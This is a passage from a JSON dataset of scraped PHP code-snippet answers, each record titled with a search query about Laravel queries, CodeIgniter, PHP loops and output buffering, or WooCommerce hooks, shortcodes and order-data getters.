    "description": "use Illuminate\\Database\\Eloquent\\Builder;  // Retrieve posts with at least one comment containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); })->get();  // Retrieve posts with at least ten comments containing words like code%... $posts = Post::whereHas('comments', function (Builder $query) {     $query->where('content', 'like', 'code%'); }, '>=', 10)->get();\nFor example, a blog post may have an infinite number of comments. And a single comment belongs to only a single post    class Post extends Model {     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }  class Comment extends Model {     public function post()     {         return $this->belongsTo('App\\Models\\Post');     } }\nWhen updating a belongsTo relationship, you may use the associate method. This  method will set the foreign key on the child model:  \t$account = App\\Account::find(10); \t$user->account()->associate($account); \t$user->save();  When removing a belongsTo relationship, you may use the dissociate method. This method will set the relationship foreign key to null:  \t$user->account()->dissociate(); \t$user->save();\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Phone extends Model {     /**      * Get the user that owns the phone.      */     public function user()     {         return $this->belongsTo('App\\Models\\User');     } }\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5091,
    "keyword": null,
    "link": null,
    "title": " where date laravel",
    "description": "$q->whereDate('created_at', '=', date('Y-m-d'));\n$users = DB::table('users')                 ->whereDate('created_at', '2016-12-31')                 ->get();\n",
    "reg_date": "2021-10-12T10:20:56.000Z"
  },
  {
    "id": 5092,
    "keyword": null,
    "link": null,
    "title": " where in codeigniter",
    "description": "$this->db->select('ae_users.employee_id, ae_users.emp_name, ae_users.emp_name2, ae_users.emp_name3'); \t\t$this->db->from('ae_users');                 \t\t$this->db->where_in('ae_users.employee_id',$employee_ids);       \t\t$query =$this->db->get();               \t\tif ($query->num_rows()) { \t\t\treturn $query->result_array(); \t\t} else { \t\t\treturn 0; \t\t}\n$this->db->like('title', 'match'); $this->db->or_like('body', $match); // WHERE `title` LIKE '%match%' ESCAPE '!' OR  `body` LIKE '%match%' ESCAPE '!' \n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5093,
    "keyword": null,
    "link": null,
    "title": " where is in array laravel",
    "description": "$items = Item::whereIn('id', [1,2,..])->get(); \n$items = DB::table('items')->whereIn('id',[1,2,..])->get();\n$items = DB::table('items')->whereIn('id', [1, 2, 3])->get();\n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5094,
    "keyword": null,
    "link": null,
    "title": " where is php.ini file in ubuntu",
    "description": "/etc/php/7.0/apache2\n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5095,
    "keyword": null,
    "link": null,
    "title": " where is phpinfo()",
    "description": " A simple method to style your own phpinfo() output.  <style type=\"text/css\"> #phpinfo {} #phpinfo pre {} #phpinfo a:link {} #phpinfo a:hover {} #phpinfo table {} #phpinfo .center {} #phpinfo .center table {} #phpinfo .center th {} #phpinfo td, th {} #phpinfo h1 {} #phpinfo h2 {} #phpinfo .p {} #phpinfo .e {} #phpinfo .h {} #phpinfo .v {} #phpinfo .vr {} #phpinfo img {} #phpinfo hr {} </style>  <div id=\"phpinfo\"> <?php  ob_start () ; phpinfo () ; $pinfo = ob_get_contents () ; ob_end_clean () ;  // the name attribute \"module_Zend Optimizer\" of an anker-tag is not xhtml valide, so replace it with \"module_Zend_Optimizer\" echo ( str_replace ( \"module_Zend Optimizer\", \"module_Zend_Optimizer\", preg_replace ( '%^.*<body>(.*)</body>.*$%ms', '$1', $pinfo ) ) ) ;  ?> </div> \n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5096,
    "keyword": null,
    "link": null,
    "title": " where like laravel",
    "description": "User::query()    ->where('name', 'LIKE', \"%{$searchTerm}%\")     ->orWhere('email', 'LIKE', \"%{$searchTerm}%\")     ->get();  reference: https://freek.dev/1182-searching-models-using-a-where-like-query-in-laravel\n$data = DB::table('borrowers')         ->join('loans', 'borrowers.id', '=', 'loans.borrower_id')         ->select('borrowers.*', 'loans.*')            ->where('loan_officers', 'like', '%' . $officerId . '%')         ->where('loans.maturity_date', '<', date(\"Y-m-d\"))         ->get(); \n$camps = $field->camps()->where('status', 0)->where(function ($q) {     $q->where('sex', Auth::user()->sex)->orWhere('sex', 0); })->get();\nDB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n$users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\n$users = DB::table('users')                 ->where('votes', '>=', 100)                 ->get();  $users = DB::table('users')                 ->where('votes', '<>', 100)                 ->get();  $users = DB::table('users')                 ->where('name', 'like', 'T%')                 ->get();\n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5097,
    "keyword": null,
    "link": null,
    "title": " where query from relation table in laravel",
    "description": "UserModel::whereHas('attachments', function ($attachmentQuery) {     $attachmentQuery->where('level', 'profile_level'); })->get(); If you want from already queried model get specific attachments then write  $userModel->attachments()->where('level', 'profile_level')->get();  it is impossible to query both UserModel and AttachementModel in single query, it must be at least two queries. Even fancy    UserModel::with('attachments')->get();,  which returns user with all attachments, do internally two queries.  OR:  I noticed that you can define relation constraints within with method  UserModel::with(['attachments' => function ($attachmentQuery) {     $attachmentQuery->where('level', 'profile_level'); }])->get();\n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5098,
    "keyword": null,
    "link": null,
    "title": " where status is null sql in laravel",
    "description": "DB::table('users')\t->whereNotNull('name')\t->get();\nDB::table('users')\t->whereNull('name')\t->get();\n",
    "reg_date": "2021-10-12T10:20:57.000Z"
  },
  {
    "id": 5099,
    "keyword": null,
    "link": null,
    "title": " where year month laravel",
    "description": "$q->whereDay('created_at', '=', date('d')); $q->whereMonth('created_at', '=', date('m')); $q->whereYear('created_at', '=', date('Y'));\n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5100,
    "keyword": null,
    "link": null,
    "title": " wherehas laravel search",
    "description": "$users = User::whereHas('posts', function($q){     $q->where('created_at', '>=', '2015-01-01 00:00:00'); })->get(); // only users that have posts from 2015 on forward are returned \n                ->whereHas('translation', function ($query) use ($name){                     $query->where('name', 'like', $name);                 }, '>=', 10) \n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5101,
    "keyword": null,
    "link": null,
    "title": " wherein laravel",
    "description": "DB::table(..)->select(..)->whereNotIn('book_price', [100,200])->get();\n DB::table('user')->whereIn('id', [100,200])->get();\n$users = DB::table('users')                     ->whereIn('id', [1, 2, 3])                     ->get();\n DB::table('user')->where('email', $userEmail)->update(array('member_type' => $plan));   \npublic function index() {     $data= User::whereIn('name', ['john','dam','smith'])->get();         dd($data);                     } \n$users = DB::table('users')->get(); \n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5102,
    "keyword": null,
    "link": null,
    "title": " while loop php",
    "description": "<?php \t$a = 0; \twhile($a<=5){     \techo $a.\"<br>\";       $a++;     }   ?>\n <?php $i = 0; do {     echo $i; } while ($i > 0); ?>  \n#Loops  <?php     #loops execute code a set number of times     /*     Types of loops     1-For     2-While     3-Do..while     4 Foreach     */      # For Loop usually use if you know the number of times it has to execute     # @params -it takes an init, condition, increment     #for($i =0;$i<=11;$i++){     #echo 'Number: '.$i;     #echo '<br>';     #}     #While loop     # @ prams - condition     #$i = 0;     #while($i < 10){     #    echo $i;     #    echo '<br>';     #    $i++;     #}     # Do...while loops     #@prapms - condition     /*$i = 0;     do{         echo $i;         echo '<br>';         $i++;         }         while($i < 10);*/     # Foreach  --- is for arrays          # $people = array('Brad', 'Jose', 'William');     #     foreach($people as $person){     #     echo $person;     #     echo '<br>';     # }     $people = array('Tony' => 'tony@example.com',         'Jose' => 'jose@example.com','William' => 'William@example.com');           foreach($people as $person => $email){         echo $person.': '.$email;         echo '<br>'; } ?>\nwhile(true) {  // Infinite Loop }\n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5103,
    "keyword": null,
    "link": null,
    "title": " why pusher not working in laravel",
    "description": "//Actually for me the issue was having the option encrypted set to //true (as in the example code from Pusher).  //I've changed it to false, and it worked.  'encrypted' => false\n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5104,
    "keyword": null,
    "link": null,
    "title": " why storage link do not work in host for laravel",
    "description": "Route::get('/linkstorage', function () {     Artisan::call('storage:link'); }); \n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5105,
    "keyword": null,
    "link": null,
    "title": " why the laravel project have many cache",
    "description": "1 _  go to app/console/Kernel.php 2 _ do everything that you want in schedule like this :   protected function schedule(Schedule $schedule)     {         $schedule->call(function () {             DB::table('recent_users')->delete();         })->daily();     }\nCache::put('key', 'value', $seconds); Cache::rememberForever('users', function () {     return DB::table('users')->get(); });  Cache::get('key'); Cache::has('key'); Cache::pull('key');\n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5106,
    "keyword": null,
    "link": null,
    "title": " why use ob start() in php",
    "description": "//why use ob_start() in php  <?php ob_start(); //Start remembering everything that would normally be outputted, but don't quite do anything with it yet $output = ob_get_contents(); //Gives whatever has been \"saved\" ob_end_clean(); //Stops saving things and discards whatever was saved ob_flush(); //Stops saving and outputs it all at once  ?>\nob_start(); //Start remembering everything that would normally be outputted, but don't quite do anything with it yet $output = ob_get_contents(); //Gives whatever has been \"saved\" ob_end_clean(); //Stops saving things and discards whatever was saved ob_flush(); //Stops saving and outputs it all at once\n<?php ob_start(); ?>  <div>     <p>Here go your view</p> </div>  <?php $content = ob_get_clean(); //now you can echo the content in base.php ?> <?php require( __DIR__ . './base.php'); ?>\n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5107,
    "keyword": null,
    "link": null,
    "title": " window.location javascript php",
    "description": "window.location.href = 'https://stackoverflow.com'; \n",
    "reg_date": "2021-10-12T10:20:58.000Z"
  },
  {
    "id": 5108,
    "keyword": null,
    "link": null,
    "title": " withErrors laravel",
    "description": "Inside controller :  return back()->withError('You are not logged in or Your session has expired');  Inside blade file :   @if(Session::has('errors'))  \ttoastr.error(\"{{Session::get('errors')->first()}}\");  @endif     It&rsquo;s a &ldquo;magic&rdquo; method, in that any call to a method with a prefix of with will  be added to the session as flash data. So withError() will add flash data under the key error; withErrors() will add flash data under the key errors;  withSuccess() will add flash data under the key of success; and so on.\n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5109,
    "keyword": null,
    "link": null,
    "title": " woocommerce action order complete",
    "description": "function mysite_woocommerce_order_status_completed( $order_id ) {     error_log( \"Order complete for order $order_id\", 0 ); } add_action( 'woocommerce_order_status_completed', 'mysite_woocommerce_order_status_completed', 10, 1 );\n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5110,
    "keyword": null,
    "link": null,
    "title": " woocommerce add custom field data to cart page",
    "description": "add_filter( \"woocommerce_add_cart_item_data\", \"cs_add_cart_item_data\", 10,2 ); function cs_add_cart_item_data( $cart_item, $product_id ){    /*   Custom Field name=\"\" attr   */   if ( isset($_POST['custom_field_name']) ) {     $cart_item['custom_field_name'] = sanitize_text_field( $getRawVal );   }   return $cart_item; }\n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5111,
    "keyword": null,
    "link": null,
    "title": " woocommerce bulk product delete",
    "description": "DELETE relations.*, taxes.*, terms.* FROM wp_term_relationships AS relations INNER JOIN wp_term_taxonomy AS taxes ON relations.term_taxonomy_id=taxes.term_taxonomy_id INNER JOIN wp_terms AS terms ON taxes.term_id=terms.term_id WHERE object_id IN (SELECT ID FROM wp_posts WHERE post_type='product');    DELETE FROM wp_postmeta WHERE post_id IN (SELECT ID FROM wp_posts WHERE post_type = 'product'); DELETE FROM wp_posts WHERE post_type = 'product'; \nDELETE relations.*, taxes.*, terms.* FROM wp_term_relationships AS relations INNER JOIN wp_term_taxonomy AS taxes ON relations.term_taxonomy_id=taxes.term_taxonomy_id INNER JOIN wp_terms AS terms ON taxes.term_id=terms.term_id WHERE object_id IN (SELECT ID FROM wp_posts WHERE post_type='product');  DELETE FROM wp_postmeta WHERE post_id IN (SELECT ID FROM wp_posts WHERE post_type = 'product'); DELETE FROM wp_posts WHERE post_type = 'product';\n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5112,
    "keyword": null,
    "link": null,
    "title": " woocommerce cart button shortcode",
    "description": "[woocommerce_cart]\necho wc()->cart->get_cart_contents_count(); \n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5113,
    "keyword": null,
    "link": null,
    "title": " woocommerce change \"Billing Details\" text",
    "description": "function wc_billing_field_strings( $translated_text, $text, $domain ) {     switch ( $translated_text ) {         case 'Billing details' :             $translated_text = __( 'Billing Info', 'woocommerce' );             break;     }     return $translated_text; } add_filter( 'gettext', 'wc_billing_field_strings', 20, 3 ); \n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5114,
    "keyword": null,
    "link": null,
    "title": " woocommerce change place order button text",
    "description": "<?php add_filter( 'woocommerce_order_button_text', 'woo_custom_order_button_text' );   function woo_custom_order_button_text() {     return __( 'Your new button text here', 'woocommerce' );  } \n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5115,
    "keyword": null,
    "link": null,
    "title": " woocommerce check if cart is not empty",
    "description": "if ( WC()->cart->get_cart_contents_count() == 0 ) {         // Do something fun } \n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5116,
    "keyword": null,
    "link": null,
    "title": " woocommerce checkout shortcode",
    "description": "[woocommerce_checkout]\n[products limit=\"8\" columns=\"4\" category=\"hoodies, tshirts\" cat_operator=\"AND\"]\n[products limit=\" \" columns=\" \" orderby=\" \"]\n[product_categories number=\"0\" parent=\"0\"]\n",
    "reg_date": "2021-10-12T10:20:59.000Z"
  },
  {
    "id": 5117,
    "keyword": null,
    "link": null,
    "title": " woocommerce custom add cart urls",
    "description": "URL: Add One Simple Product to Cart href=&rdquo;https://yourdomain.com/?add-to-cart=25&Prime;  URL: Add One Simple Product to Cart with Quantity = 3 href=&rdquo;https://yourdomain.com/?add-to-cart=25&quantity=3&Prime;  URL: Add One Simple Product to Cart & Redirect to Cart Afterwards href=&rdquo;https://yourdomain.com/cart/?add-to-cart=25&Prime;  URL: Add One Simple Product to Cart & Redirect to Checkout Afterwards href=&rdquo;https://yourdomain.com/checkout/?add-to-cart=25&Prime;  URL: Add One Simple Product to Cart & Redirect to Any Page Afterwards href=&rdquo;https://yourdomain.com/your_custom_page/?add-to-cart=25&Prime;  URL: Add One Variable Product to Cart href=&rdquo;https://yourdomain.com/?add-to-cart=88&Prime;  URL: Add One Variable Product to Cart (with Quantity = 3) href=&rdquo;https://yourdomain.com/?add-to-cart=88&quantity=3&Prime;  URL: Add One Variable Product to Cart & Redirect to Cart href=&rdquo;https://yourdomain.com/cart/?add-to-cart=88&Prime;  URL: Add One Variable Product to Cart & Redirect to Checkout href=&rdquo;https://yourdomain.com/checkout/?add-to-cart=88&Prime;  URL: Add One Variable Product to Cart & Redirect to Any Page href=&rdquo;https://yourdomain.com/any-page-url/?add-to-cart=88&Prime;  URL: Add a Grouped Product to Cart You will need the Grouped Product ID, which can be found in the usual way, and also the sub-product IDs. Then, use something like:  href=&rdquo;https://yourdomain.com/?add-to-cart=3111&quantity[1803]=5&quantity[1903]=2&Prime;\nwww.yourwebsite.com/?add-to-cart=your product id\n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5118,
    "keyword": null,
    "link": null,
    "title": " woocommerce disable zoom on product image",
    "description": "/* Disable zoom on Woocommerce Product Images */  // Append to your child theme's functions.php function remove_image_zoom_support() {     remove_theme_support( 'wc-product-gallery-zoom' ); } add_action( 'wp', 'remove_image_zoom_support', 100 );\n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5119,
    "keyword": null,
    "link": null,
    "title": " woocommerce get category imgae",
    "description": "// verify that this is a product category page if ( is_product_category() ){     global $wp_query;      // get the query object     $cat = $wp_query->get_queried_object();      // get the thumbnail id using the queried category term_id     $thumbnail_id = get_woocommerce_term_meta( $cat->term_id, 'thumbnail_id', true );       // get the image URL     $image = wp_get_attachment_url( $thumbnail_id );       // print the IMG HTML     echo \"<img src='{$image}' alt='' width='762' height='365' />\"; }\n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5120,
    "keyword": null,
    "link": null,
    "title": " woocommerce get my account url",
    "description": "<a href=\"<?php echo get_permalink( get_option('woocommerce_myaccount_page_id') ); ?>\" title=\"<?php _e('My Account',''); ?>\"><?php _e('My Account',''); ?></a> \n<a href=\"<?php echo get_permalink( get_option('woocommerce_myaccount_page_id') ); ?>\" title=\"<?php _e('My account', 'woocommerce'); ?>\"><?php _e('My account', 'woocommerce'); ?></a>\n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5121,
    "keyword": null,
    "link": null,
    "title": " woocommerce get order data",
    "description": "// Get $order object when you have the ID. $order = wc_get_order( $order_id );  // Get order key. $order->get_order_key();  // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();  // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = $item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }  // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status();\n// Get Order ID and Key $order->get_id(); $order->get_order_key();   // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();    // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = $item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }   // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status(); \n",
    "reg_date": "2021-10-12T10:21:00.000Z"
  },
  {
    "id": 5122,
    "keyword": null,
    "link": null,
    "title": " woocommerce get order info",
    "description": "// Get $order object when you have the ID. $order = wc_get_order( $order_id );  // Get order key. $order->get_order_key();  // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();  // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = $item->get_product_id();    $variation_id = $item->get_variation_id();    $product = $item->get_product();    $name = $item->get_name();    $quantity = $item->get_quantity();    $subtotal = $item->get_subtotal();    $total = $item->get_total();    $tax = $item->get_subtotal_tax();    $taxclass = $item->get_tax_class();    $taxstat = $item->get_tax_status();    $allmeta = $item->get_meta_data();    $somemeta = $item->get_meta( '_whatever', true );    $type = $item->get_type(); }  // Other Secondary Items Stuff $order->get_items_key(); $order->get_items_tax_classes(); $order->get_item_count(); $order->get_item_total(); $order->get_downloadable_items();    // Get Order Lines $order->get_line_subtotal(); $order->get_line_tax(); $order->get_line_total();    // Get Order Shipping $order->get_shipping_method(); $order->get_shipping_methods(); $order->get_shipping_to_display();    // Get Order Dates $order->get_date_created(); $order->get_date_modified(); $order->get_date_completed(); $order->get_date_paid();    // Get Order User, Billing & Shipping Addresses $order->get_customer_id(); $order->get_user_id(); $order->get_user(); $order->get_customer_ip_address(); $order->get_customer_user_agent(); $order->get_created_via(); $order->get_customer_note(); $order->get_address_prop(); $order->get_billing_first_name(); $order->get_billing_last_name(); $order->get_billing_company(); $order->get_billing_address_1(); $order->get_billing_address_2(); $order->get_billing_city(); $order->get_billing_state(); $order->get_billing_postcode(); $order->get_billing_country(); $order->get_billing_email(); $order->get_billing_phone(); $order->get_shipping_first_name(); $order->get_shipping_last_name(); $order->get_shipping_company(); $order->get_shipping_address_1(); $order->get_shipping_address_2(); $order->get_shipping_city(); $order->get_shipping_state(); $order->get_shipping_postcode(); $order->get_shipping_country(); $order->get_address(); $order->get_shipping_address_map_url(); $order->get_formatted_billing_full_name(); $order->get_formatted_shipping_full_name(); $order->get_formatted_billing_address(); $order->get_formatted_shipping_address();    // Get Order Payment Details $order->get_payment_method(); $order->get_payment_method_title(); $order->get_transaction_id();    // Get Order URLs $order->get_checkout_payment_url(); $order->get_checkout_order_received_url(); $order->get_cancel_order_url(); $order->get_cancel_order_url_raw(); $order->get_cancel_endpoint(); $order->get_view_order_url(); $order->get_edit_order_url();    // Get Order Status $order->get_status();\n// Get an instance of the WC_Order object $order = wc_get_order( $order_id );  $order_data = $order->get_data(); // The Order data  $order_id = $order_data['id']; $order_parent_id = $order_data['parent_id']; $order_status = $order_data['status']; $order_currency = $order_data['currency']; $order_version = $order_data['version']; $order_payment_method = $order_data['payment_method']; $order_payment_method_title = $order_data['payment_method_title']; $order_payment_method = $order_data['payment_method']; $order_payment_method = $order_data['payment_method'];  ## Creation and modified WC_DateTime Object date string ##  // Using a formated date ( with php date() function as method) $order_date_created = $order_data['date_created']->date('Y-m-d H:i:s'); $order_date_modified = $order_data['date_modified']->date('Y-m-d H:i:s');  // Using a timestamp ( with php getTimestamp() function as method) $order_timestamp_created = $order_data['date_created']->getTimestamp(); $order_timestamp_modified = $order_data['date_modified']->getTimestamp();  $order_discount_total = $order_data['discount_total']; $order_discount_tax = $order_data['discount_tax']; $order_shipping_total = $order_data['shipping_total']; $order_shipping_tax = $order_data['shipping_tax']; $order_total = $order_data['cart_tax']; $order_total_tax = $order_data['total_tax']; $order_customer_id = $order_data['customer_id']; // ... and so on  ## BILLING INFORMATION:  $order_billing_first_name = $order_data['billing']['first_name']; $order_billing_last_name = $order_data['billing']['last_name']; $order_billing_company = $order_data['billing']['company']; $order_billing_address_1 = $order_data['billing']['address_1']; $order_billing_address_2 = $order_data['billing']['address_2']; $order_billing_city = $order_data['billing']['city']; $order_billing_state = $order_data['billing']['state']; $order_billing_postcode = $order_data['billing']['postcode']; $order_billing_country = $order_data['billing']['country']; $order_billing_email = $order_data['billing']['email']; $order_billing_phone = $order_data['billing']['phone'];  ## SHIPPING INFORMATION:  $order_shipping_first_name = $order_data['shipping']['first_name']; $order_shipping_last_name = $order_data['shipping']['last_name']; $order_shipping_company = $order_data['shipping']['company']; $order_shipping_address_1 = $order_data['shipping']['address_1']; $order_shipping_address_2 = $order_data['shipping']['address_2']; $order_shipping_city = $order_data['shipping']['city']; $order_shipping_state = $order_data['shipping']['state']; $order_shipping_postcode = $order_data['shipping']['postcode']; $order_shipping_country = $order_data['shipping']['country'];\n// Get an instance of the WC_Order object (same as before) $order = wc_get_order( $order_id );  $order_id  = $order->get_id(); // Get the order ID $parent_id = $order->get_parent_id(); // Get the parent order ID (for subscriptions&hellip;)  $user_id   = $order->get_user_id(); // Get the costumer ID $user      = $order->get_user(); // Get the WP_User object  $order_status  = $order->get_status(); // Get the order status  $currency      = $order->get_currency(); // Get the currency used   $payment_method = $order->get_payment_method(); // Get the payment method ID $payment_title = $order->get_payment_method_title(); // Get the payment method title $date_created  = $order->get_date_created(); // Get date created (WC_DateTime object) $date_modified = $order->get_date_modified(); // Get date modified (WC_DateTime object)  $billing_country = $order->get_billing_country(); // Customer billing country  // ... and so on ...\n// Get Order ID and Key $order->get_id(); $order->get_order_key();   // Get Order Totals $0.00 $order->get_formatted_order_total(); $order->get_cart_tax(); $order->get_currency(); $order->get_discount_tax(); $order->get_discount_to_display(); $order->get_discount_total(); $order->get_fees(); $order->get_formatted_line_subtotal(); $order->get_shipping_tax(); $order->get_shipping_total(); $order->get_subtotal(); $order->get_subtotal_to_display(); $order->get_tax_location(); $order->get_tax_totals(); $order->get_taxes(); $order->get_total(); $order->get_total_discount(); $order->get_total_tax(); $order->get_total_refunded(); $order->get_total_tax_refunded(); $order->get_total_shipping_refunded(); $order->get_item_count_refunded(); $order->get_total_qty_refunded(); $order->get_qty_refunded_for_item(); $order->get_total_refunded_for_item(); $order->get_tax_refunded_for_item(); $order->get_total_tax_refunded_by_rate_id(); $order->get_remaining_refund_amount();    // Get and Loop Over Order Items foreach ( $order->get_items() as $item_id => $item ) {    $product_id = 